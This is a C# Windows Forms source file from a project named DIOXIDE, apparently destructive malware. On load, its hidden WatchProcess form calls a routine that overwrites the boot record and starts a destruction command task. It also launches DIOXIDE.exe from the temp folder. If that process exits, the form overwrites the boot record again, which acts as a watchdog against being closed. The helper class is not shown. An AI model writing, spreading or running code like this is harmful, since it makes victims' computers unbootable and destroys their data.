using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DIOXIDE
{
    public partial class WatchProcess : Form
    {
        public WatchProcess()
        {
            InitializeComponent();
        }

        private void WatchProcess_Load(object sender, EventArgs e)
        {
            destruction destruction = new destruction();
            destruction.OverwriteBoot();
            Task.Run(destruction.destructionCMD);
            string temppath = System.IO.Path.GetTempPath();
            System.Diagnostics.Process hProcess = System.Diagnostics.Process.Start(temppath + "\\" + "DIOXIDE.exe");
            hProcess.EnableRaisingEvents = true;
            hProcess.Exited += new System.EventHandler(Mistake4_Exited);
            this.Hide();
        }
        private void Mistake4_Exited(object sender, System.EventArgs e)
        {
            destruction destruction = new destruction();
            destruction.OverwriteBoot();
            destruction.Exit();
        }
    }
}